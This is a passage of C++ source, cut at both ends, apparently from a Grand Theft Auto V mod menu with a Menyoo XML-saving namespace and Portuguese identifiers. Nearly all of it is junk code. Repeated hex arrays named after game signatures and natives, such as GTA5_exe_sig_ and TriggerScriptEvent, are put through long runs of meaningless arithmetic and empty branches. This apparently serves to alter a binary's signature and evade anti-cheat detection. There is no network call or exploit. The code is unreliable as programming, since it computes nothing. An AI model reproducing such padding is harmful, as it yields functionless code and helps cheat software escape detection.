			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			Extern_Reader::INIFile::Float::GravarFloat(0, buffer, "RotZ");
		}
	}
}
namespace Menyoo
{
	int PED_TO_NET_ = 2;
	int NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
	int offset = (PED_TO_NET_ * 0xA) + 0xBB;
	int  GTA5_exe_sig_[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	double a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
	double a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
	int GTA5_sig_[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int GTA5_sig_1[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int GTA5_sig_2[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int GTA5_sig_3[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int GTA5_sig_4[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int  GTA5_exe_sig_ss[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
	int  GTA5_sig_ss4d[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int  arrassyssd[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
	float a = 0.0f;
	float b = 0.0f;
	int  GTA5_exe_sig_Zero[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	double sa1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
	int GTA5_sig_2s[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int GTA5_sig_3dd[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int offsetw = (PED_TO_NET_ * 0xA) + 0xBB;
	int  GTA5_sig_10[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int  GTA5_sig_ss4[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int  arrassyss[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
	int  Eduardo[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int GTA5_exe_sig_Dois[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	double sa1w = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
	int  GTA5_sig_2sw[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int  GTA5_sig_3ddd[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };

	int ponteiro = 2;
	int aaaaaa = ponteiro * 2;
	int  matriz[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int endereco[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int endereco1[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int endereco2[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int endereco3[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int endereco4[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int  matrizss[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
	int  enderecoss4d[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int  matrizZero[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int endereco2s[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int endereco3dd[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int  endereco10[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int  enderecoss4[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int matrizDois[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int  endereco2sw[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int  endereco3ddd[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int  TriggerScriptEvent[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int  TriggerScriptEventss[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
	int  TriggerScriptEventZero[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int TriggerScriptEventDois[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	std::string XMLPath;
	namespace SalvarXML
	{
		/*
		Exemplo de salvar:
		Menyoo::XMLPath = ".\\MapaMenyoo.xml";
		Menyoo::SalvarXML::MenyooCabecalho();
		Menyoo::SalvarXML::ReferenceCoords(1111.1111, 2222.2222, 3333.3333);
		GTA::Spawn_Struct SpawnPed;
		GTA::Spawn_Struct SpawnProp;
		GTA::Spawn_Struct SpawnVeh;
		Menyoo::SalvarXML::AddSpawn_Ped(SpawnPed);
		Menyoo::SalvarXML::AddSpawnToXML_Prop(SpawnProp);
		Menyoo::SalvarXML::AddSpawn_Vehicle(SpawnVeh);
		Menyoo::SalvarXML::FinalizarXML();

	*/
		int PED_TO_NET_ = 2;
		int NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
		int offset = (PED_TO_NET_ * 0xA) + 0xBB;
		int  GTA5_exe_sig_[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		double a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
		double a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
		int GTA5_sig_[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int GTA5_sig_1[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int GTA5_sig_2[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int GTA5_sig_3[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int GTA5_sig_4[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  GTA5_exe_sig_ss[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
		int  GTA5_sig_ss4d[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  arrassyssd[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
		float a = 0.0f;
		float b = 0.0f;
		int  GTA5_exe_sig_Zero[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		double sa1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
		int GTA5_sig_2s[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int GTA5_sig_3dd[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int offsetw = (PED_TO_NET_ * 0xA) + 0xBB;
		int  GTA5_sig_10[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  GTA5_sig_ss4[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  arrassyss[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
		int  Eduardo[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int GTA5_exe_sig_Dois[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		double sa1w = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
		int  GTA5_sig_2sw[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  GTA5_sig_3ddd[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };

		int ponteiro = 2;
		int aaaaaa = ponteiro * 2;
		int  matriz[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int endereco[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int endereco1[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int endereco2[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int endereco3[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int endereco4[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  matrizss[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
		int  enderecoss4d[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  matrizZero[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int endereco2s[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int endereco3dd[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  endereco10[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  enderecoss4[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int matrizDois[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  endereco2sw[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  endereco3ddd[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  TriggerScriptEvent[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  TriggerScriptEventss[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
		int  TriggerScriptEventZero[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int TriggerScriptEventDois[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		void MenyooCabecalho()
		{
			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
